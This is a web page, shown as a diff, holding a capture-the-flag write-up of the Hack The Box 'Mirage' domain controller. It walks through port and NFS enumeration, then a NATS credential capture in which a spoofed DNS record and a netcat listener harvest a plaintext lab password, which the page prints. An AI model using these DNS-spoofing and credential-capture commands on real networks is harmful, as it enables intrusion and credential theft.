@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Mirage | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Setting up kerberos realm, SMB (445), NFS (2049)." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-mirage/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Mirage" /><meta property="og:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Setting up kerberos realm, SMB (445), NFS (2049)." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-mirage/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-mirage/og.png?v=9ad44075" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Mirage" /><meta name="twitter:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Setting up kerberos realm, SMB (445), NFS (2049)." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-mirage/og.png?v=9ad44075" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Mirage","description":"Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Setting up kerberos realm, SMB (445), NFS (2049).","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-mirage/","datePublished":"2026-10-10","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Mirage","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-mirage/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Mirage</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-10-10 · 24 min read</p><h1>Mirage</h1><p>Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Setting up kerberos realm, SMB (445), NFS (2049).</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Mirage" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-mirage.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head"><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Mirage</h2></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div></dl><p class="room-link"><a href="https://app.hackthebox.com/machines/Mirage" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ sudo nxc smb 10.129.232.163 --generate-hosts-file /etc/hosts     
+
+SMB         10.129.232.163  445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)</code></pre><h2>Setting up kerberos realm</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ sudo nxc smb 10.129.232.163 --generate-krb5-file /etc/krb5.conf 
+SMB         10.129.232.163  445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         10.129.232.163  445    dc01             [+] krb5 conf saved to: /etc/krb5.conf
+SMB         10.129.232.163  445    dc01             [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf</code></pre><p>Since NTLM is disabled, ill be interacting with kerberos so ill set this now</p><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nmap -p- --min-rate=2000 -sT -Pn 10.129.232.163 -vv
+
+Nmap scan report for 10.129.232.163
+Host is up, received user-set (0.013s latency).
+Scanned at 2026-10-10 16:04:09 BST for 11s
+Not shown: 65506 closed tcp ports (conn-refused)
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack
+88/tcp    open  kerberos-sec     syn-ack
+111/tcp   open  rpcbind          syn-ack
+135/tcp   open  msrpc            syn-ack
+139/tcp   open  netbios-ssn      syn-ack
+389/tcp   open  ldap             syn-ack
+445/tcp   open  microsoft-ds     syn-ack
+464/tcp   open  kpasswd5         syn-ack
+593/tcp   open  http-rpc-epmap   syn-ack
+636/tcp   open  ldapssl          syn-ack
+2049/tcp  open  nfs              syn-ack
+3268/tcp  open  globalcatLDAP    syn-ack
+3269/tcp  open  globalcatLDAPssl syn-ack
+4222/tcp  open  vrml-multi-use   syn-ack
+5985/tcp  open  wsman            syn-ack
+9389/tcp  open  adws             syn-ack
+47001/tcp open  winrm            syn-ack
+49664/tcp open  unknown          syn-ack
+49665/tcp open  unknown          syn-ack
+49666/tcp open  unknown          syn-ack
+49667/tcp open  unknown          syn-ack
+49668/tcp open  unknown          syn-ack
+51462/tcp open  unknown          syn-ack
+51463/tcp open  unknown          syn-ack
+51478/tcp open  unknown          syn-ack
+51484/tcp open  unknown          syn-ack
+51508/tcp open  unknown          syn-ack
+58086/tcp open  unknown          syn-ack
+62970/tcp open  unknown          syn-ack</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nmap -p 53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985 -A --min-rate=2000 -sT -Pn dc01.mirage.htb
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-10 16:08 +0100
+Nmap scan report for dc01.mirage.htb (10.129.232.163)
+Host is up (0.013s latency).
+
+PORT     STATE SERVICE         VERSION
+53/tcp   open  domain          Simple DNS Plus
+88/tcp   open  kerberos-sec    Microsoft Windows Kerberos (server time: 2026-10-10 22:08:49Z)
+111/tcp  open  rpcbind         2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp  open  msrpc           Microsoft Windows RPC
+139/tcp  open  netbios-ssn     Microsoft Windows netbios-ssn
+389/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+|_ssl-date: TLS randomness does not represent time
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+2049/tcp open  nlockmgr        1-4 (RPC #100021)
+3268/tcp open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+3269/tcp open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+|_ssl-date: TLS randomness does not represent time
+4222/tcp open  vrml-multi-use?
+| fingerprint-strings: 
+|   GenericLines: 
+|     INFO {&quot;server_id&quot;:&quot;NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV&quot;,&quot;server_name&quot;:&quot;NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV&quot;,&quot;version&quot;:&quot;2.11.3&quot;,&quot;proto&quot;:1,&quot;git_commit&quot;:&quot;a82cfda&quot;,&quot;go&quot;:&quot;go1.24.2&quot;,&quot;host&quot;:&quot;0.0.0.0&quot;,&quot;port&quot;:4222,&quot;headers&quot;:true,&quot;auth_required&quot;:true,&quot;max_payload&quot;:1048576,&quot;jetstream&quot;:true,&quot;client_id&quot;:17,&quot;client_ip&quot;:&quot;10.10.14.61&quot;,&quot;xkey&quot;:&quot;XBXOTVN3PTCXANU3EO4N7VV6NSBAYCRRIEQZTS4PBMIFEP6KJDXWSFM6&quot;} 
+|     -ERR &#39;Authorization Violation&#39;
+|   GetRequest: 
+|     INFO {&quot;server_id&quot;:&quot;NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV&quot;,&quot;server_name&quot;:&quot;NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV&quot;,&quot;version&quot;:&quot;2.11.3&quot;,&quot;proto&quot;:1,&quot;git_commit&quot;:&quot;a82cfda&quot;,&quot;go&quot;:&quot;go1.24.2&quot;,&quot;host&quot;:&quot;0.0.0.0&quot;,&quot;port&quot;:4222,&quot;headers&quot;:true,&quot;auth_required&quot;:true,&quot;max_payload&quot;:1048576,&quot;jetstream&quot;:true,&quot;client_id&quot;:18,&quot;client_ip&quot;:&quot;10.10.14.61&quot;,&quot;xkey&quot;:&quot;XBXOTVN3PTCXANU3EO4N7VV6NSBAYCRRIEQZTS4PBMIFEP6KJDXWSFM6&quot;} 
+|     -ERR &#39;Authorization Violation&#39;
+|   HTTPOptions: 
+|     INFO {&quot;server_id&quot;:&quot;NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV&quot;,&quot;server_name&quot;:&quot;NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV&quot;,&quot;version&quot;:&quot;2.11.3&quot;,&quot;proto&quot;:1,&quot;git_commit&quot;:&quot;a82cfda&quot;,&quot;go&quot;:&quot;go1.24.2&quot;,&quot;host&quot;:&quot;0.0.0.0&quot;,&quot;port&quot;:4222,&quot;headers&quot;:true,&quot;auth_required&quot;:true,&quot;max_payload&quot;:1048576,&quot;jetstream&quot;:true,&quot;client_id&quot;:19,&quot;client_ip&quot;:&quot;10.10.14.61&quot;,&quot;xkey&quot;:&quot;XBXOTVN3PTCXANU3EO4N7VV6NSBAYCRRIEQZTS4PBMIFEP6KJDXWSFM6&quot;} 
+|     -ERR &#39;Authorization Violation&#39;
+|   NULL: 
+|     INFO {&quot;server_id&quot;:&quot;NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV&quot;,&quot;server_name&quot;:&quot;NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV&quot;,&quot;version&quot;:&quot;2.11.3&quot;,&quot;proto&quot;:1,&quot;git_commit&quot;:&quot;a82cfda&quot;,&quot;go&quot;:&quot;go1.24.2&quot;,&quot;host&quot;:&quot;0.0.0.0&quot;,&quot;port&quot;:4222,&quot;headers&quot;:true,&quot;auth_required&quot;:true,&quot;max_payload&quot;:1048576,&quot;jetstream&quot;:true,&quot;client_id&quot;:16,&quot;client_ip&quot;:&quot;10.10.14.61&quot;,&quot;xkey&quot;:&quot;XBXOTVN3PTCXANU3EO4N7VV6NSBAYCRRIEQZTS4PBMIFEP6KJDXWSFM6&quot;} 
+|_    -ERR &#39;Authentication Timeout&#39;
+5985/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (96%), Microsoft Windows Server 2016 (96%), Microsoft Windows 11 24H2 (96%), Microsoft Windows Server 2022 (95%), Microsoft Windows 11 24H2 - 25H2 (95%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2019 (92%), Microsoft Windows Server 2016 or Server 2019 (91%), Microsoft Windows Server 2012 (91%), Microsoft Windows 10 1703 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>System time</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ ntpdate dc01.mirage.htb                    
+2026-10-10 23:11:35.843886 (+0100) +25199.759920 +/- 0.006475 dc01.mirage.htb 10.129.232.163 s1 no-leap
+CLOCK: step_systime: Operation not permitted</code></pre><p>So the DC is running at +7h</p><h2>SMB (445)</h2><p>Null auth not really possible when only kerberos is enabled</p><p>Guest account is also disabled</p><h2>NFS (2049)</h2><p>Looks like root escape is not possible here</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc nfs dc01.mirage.htb --shares
+NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Supported NFS versions: (2, 3, 4) (root escape:False)
+NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Enumerating NFS Shares
+NFS         10.129.232.163  2049   dc01.mirage.htb  UID        Perms    Storage Usage    Share                          Access List    
+NFS         10.129.232.163  2049   dc01.mirage.htb  ---        -----    -------------    -----                          -----------    
+NFS         10.129.232.163  2049   dc01.mirage.htb  4294967294 r--      16.3GB/19.8GB    /MirageReports</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc nfs dc01.mirage.htb --share &#39;/MirageReports&#39; --ls &#39;/&#39;
+NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Supported NFS versions: (2, 3, 4) (root escape:False)
+NFS         10.129.232.163  2049   dc01.mirage.htb  UID        Perms  File Size     File Path
+NFS         10.129.232.163  2049   dc01.mirage.htb  ---        -----  ---------     ---------
+NFS         10.129.232.163  2049   dc01.mirage.htb  4294967294 dr--   64.0B         /MirageReports/.
+NFS         10.129.232.163  2049   dc01.mirage.htb  4294967294 dr--   64.0B         /MirageReports/..
+NFS         10.129.232.163  2049   dc01.mirage.htb  4294967294 -r-x   8.1MB         /MirageReports/Incident_Report_Missing_DNS_Record_nats-svc.pdf
+NFS         10.129.232.163  2049   dc01.mirage.htb  4294967294 -r-x   8.9MB         /MirageReports/Mirage_Authentication_Hardening_Report.pdf</code></pre><p>Looks like some pdf files in the NFS share</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc nfs dc01.mirage.htb --share &#39;/MirageReports&#39; --get-file Incident_Report_Missing_DNS_Record_nats-svc.pdf Incident_Report_Missing_DNS_Record_nats-svc.pdf
+NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Supported NFS versions: (2, 3, 4) (root escape:False)
+NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Downloading Incident_Report_Missing_DNS_Record_nats-svc.pdf to Incident_Report_Missing_DNS_Record_nats-svc.pdf
+NFS         10.129.232.163  2049   dc01.mirage.htb  File successfully downloaded from Incident_Report_Missing_DNS_Record_nats-svc.pdf to Incident_Report_Missing_DNS_Record_nats-svc.pdf
+
+❯❯❯ nxc nfs dc01.mirage.htb --share &#39;/MirageReports&#39; --get-file Mirage_Authentication_Hardening_Report.pdf Mirage_Authentication_Hardening_Report.pdf
+NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Supported NFS versions: (2, 3, 4) (root escape:False)
+NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Downloading Mirage_Authentication_Hardening_Report.pdf to Mirage_Authentication_Hardening_Report.pdf
+NFS         10.129.232.163  2049   dc01.mirage.htb  File successfully downloaded from Mirage_Authentication_Hardening_Report.pdf to Mirage_Authentication_Hardening_Report.pdf</code></pre><p>Ill download both of these files and have a look</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc nfs dc01.mirage.htb --share &#39;/MirageReports&#39; --put-file test.txt test.txt 
+NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Supported NFS versions: (2, 3, 4) (root escape:False)
+NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Uploading from test.txt to test.txt
+NFS         10.129.232.163  2049   dc01.mirage.htb  [*] Trying to create test.txt
+NFS         10.129.232.163  2049   dc01.mirage.htb  [-] Error writing file to share test.txt: NFS3ERR_ROFS</code></pre><p>I dont have the ability to write to the share</p><p><img src="images/mirage/pasted-image-20261010162407.webp" alt="Screenshot" loading="lazy" /></p><p>There is a report of a missing DNS record for the NATS service, which is running on port 4222</p><p><img src="images/mirage/pasted-image-20261010162706.webp" alt="Screenshot" loading="lazy" /></p><p>Image above could be helpful for when and if i need to interact with NATS</p><p>Also a user <code>dev_account_a</code></p><p><img src="images/mirage/pasted-image-20261010162844.webp" alt="Screenshot" loading="lazy" /></p><p><img src="images/mirage/pasted-image-20261010162915.webp" alt="Screenshot" loading="lazy" /></p><p>Some more potentially helpful info</p><p><img src="images/mirage/pasted-image-20261010163227.webp" alt="Screenshot" loading="lazy" /></p><p>The other report shows a potential user, but other than that basically just explains the disabling of NTLM, however its mentioned it was a gradual process, some systems may still allow NTLM</p><h2>NATS (4222)</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ echo | nc dc01.mirage.htb 4222 
+INFO {&quot;server_id&quot;:&quot;NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV&quot;,&quot;server_name&quot;:&quot;NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV&quot;,&quot;version&quot;:&quot;2.11.3&quot;,&quot;proto&quot;:1,&quot;git_commit&quot;:&quot;a82cfda&quot;,&quot;go&quot;:&quot;go1.24.2&quot;,&quot;host&quot;:&quot;0.0.0.0&quot;,&quot;port&quot;:4222,&quot;headers&quot;:true,&quot;auth_required&quot;:true,&quot;max_payload&quot;:1048576,&quot;jetstream&quot;:true,&quot;client_id&quot;:80,&quot;client_ip&quot;:&quot;10.10.14.61&quot;,&quot;xkey&quot;:&quot;XBXOTVN3PTCXANU3EO4N7VV6NSBAYCRRIEQZTS4PBMIFEP6KJDXWSFM6&quot;} 
+-ERR &#39;Authorization Violation&#39;</code></pre><p>Looks like there is an authorization error</p><p>Also looks like its giving me the version <code>2.11.3</code>, and also a reference to a git commit</p><p><a href="https://hacktricks.wiki/en/network-services-pentesting/4222-pentesting-nats.html#credential-capture-via-dnsservice-impersonation" target="_blank" rel="noreferrer">https://hacktricks.wiki/en/network-services-pentesting/4222-pentesting-nats.html#credential-capture-via-dnsservice-impersonation</a></p><p>This attack could be possible, but for the moment i dont have credentials to add a DNS record yet</p><p>Just like the pdf file said, the record does not exist in DNS for the service</p><p>Ill use what hacktricks says and ill install the client</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ ~/go/bin/nats context save dc01.mirage.htb --server=&#39;nats://dc01.mirage.htb:4222&#39;
+NATS Configuration Context &quot;dc01.mirage.htb&quot;
+
+  Server URLs: nats://dc01.mirage.htb:4222
+         Path: /home/kali/.config/nats/context/dc01.mirage.htb.json</code></pre><p>I first have to define the context of the system, this is almost like an environment variable in bash</p><h2>Credential capture via DNS/service impersonation</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nsupdate                                                                    
+&gt; server 10.129.232.163
+&gt; update add nats-svc.mirage.htb 60 A 10.10.14.61
+&gt; send
+&gt; </code></pre><p>Ill add a DNS record for my IP</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nc dc01.mirage.htb 4222 | head -1 | nc -lnvp 4222                           
+listening on [any] 4222 ...
+connect to [10.10.14.61] from (UNKNOWN) [10.129.232.163] 51057
+CONNECT {&quot;verbose&quot;:false,&quot;pedantic&quot;:false,&quot;user&quot;:&quot;Dev_Account_A&quot;,&quot;pass&quot;:&quot;hx5h7F5554fP@1337!&quot;,&quot;tls_required&quot;:false,&quot;name&quot;:&quot;NATS CLI Version 0.2.2&quot;,&quot;lang&quot;:&quot;go&quot;,&quot;version&quot;:&quot;1.41.1&quot;,&quot;protocol&quot;:1,&quot;echo&quot;:true,&quot;headers&quot;:true,&quot;no_responders&quot;:true}
+PING</code></pre><p>I have now captured plaintext credentials</p><p>All this can be found in hacktricks:</p><p><a href="https://hacktricks.wiki/en/network-services-pentesting/4222-pentesting-nats.html#credential-capture-via-dnsservice-impersonation" target="_blank" rel="noreferrer">https://hacktricks.wiki/en/network-services-pentesting/4222-pentesting-nats.html#credential-capture-via-dnsservice-impersonation</a></p><p>These creds dont work on the domain, but they could be for the NATS service</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ ~/go/bin/nats context add mirage -s nats://dc01.mirage.htb --user Dev_Account_A --password &#39;hx5h7F5554fP@1337!&#39;
+NATS Configuration Context &quot;mirage&quot;
+
+  Server URLs: nats://dc01.mirage.htb
+     Username: Dev_Account_A
+     Password: ******************
+         Path: /home/kali/.config/nats/context/mirage.json</code></pre><p>I can add these to the client</p><h2>NATS enumeration to find logged credentials</h2><p>So with the new creds i can auth to the service and start enumerating it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ ~/go/bin/nats account info --context mirage 
+Account Information
+
+                           User: Dev_Account_A
+                        Account: dev
+                        Expires: never
+                      Client ID: 189
+                      Client IP: 10.10.14.61
+                            RTT: 13ms
+              Headers Supported: true
+                Maximum Payload: 1.0 MiB
+                  Connected URL: nats://dc01.mirage.htb:4222
+              Connected Address: 10.129.232.163:4222
+            Connected Server ID: NCN74AT3XD6OBJIKFUN3TNNWT6Q3JNI4RUDLWYJPBMSNG4AVWU53MQSV
+       Connected Server Version: 2.11.3
+                 TLS Connection: no
+
+JetStream Account Information:
+
+Account Usage:
+
+                        Storage: 570 B
